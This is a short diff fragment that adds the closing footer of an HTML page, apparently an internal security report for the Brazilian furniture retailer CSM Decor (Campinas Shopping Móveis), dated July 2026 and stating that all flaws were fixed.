+    <span>CSM Decor — Campinas Shopping Móveis · Relatório Interno de Segurança</span>
+    <span>Julho de 2026 · Todas as falhas corrigidas</span>
+  </div>
+
+</body>
+</html>
